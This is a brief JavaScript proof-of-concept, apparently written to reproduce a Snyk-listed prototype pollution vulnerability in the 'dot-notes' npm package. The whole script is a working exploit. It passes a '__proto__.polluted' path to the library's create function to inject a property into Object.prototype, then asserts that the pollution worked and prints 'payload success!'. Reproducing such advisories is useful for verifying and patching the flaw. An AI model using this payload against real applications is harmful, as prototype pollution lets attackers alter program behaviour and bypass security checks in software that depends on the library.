//https://snyk.io/vuln/SNYK-JS-DOTNOTES-598668

const dots = require('dot-notes');
const { assert } = require("@firebase/util");
var obj = {}
console.log("Before : " + obj.polluted);
dots.create({}, '__proto__.polluted',"yes");
console.log("After : " +{}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");